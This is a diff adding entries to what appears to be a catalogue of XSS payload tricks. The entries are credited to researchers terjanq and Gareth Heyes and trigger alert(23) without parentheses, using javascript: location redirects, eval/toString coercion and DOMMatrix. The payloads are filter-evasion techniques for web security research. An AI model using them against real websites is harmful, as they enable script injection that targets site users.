@@ -91,6 +91,26 @@ xss.html
     
 ---
 
+[terjanq](https://twitter.com/terjanq)
+
+Put `%0aalert(/23/)//` anywhere in the URL
+
+    location='javascript:'+location
+    location=/javascript:/.source+location
+    location=`javascript:`+location
+    
+---
+
+[terjanq](https://twitter.com/terjanq)
+
+```
+x={...eval+0,toString:Array.prototype.shift,length:15},
+x+x+x+x+x+x+x+x+x+x+x+x+x,
+location = /javascript:/.source + alert.name+x+23+x
+```
+    
+---
+
 [terjanq](https://twitter.com/terjanq/status/1239617536318152704?s=20)
 
     
@@ -100,6 +120,17 @@ xss.html
     Function`a${unescape. call`${location}`}```
     
 ---
+
+[Gareth Heyes](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)
+
+```
+x=new DOMMatrix;
+matrix=alert;
+x.a=23;
+location='javascript'+':'+x
+```
+    
+--- 
 
 [BitK](https://twitter.com/BitK_/status/1239581718635479041)
 
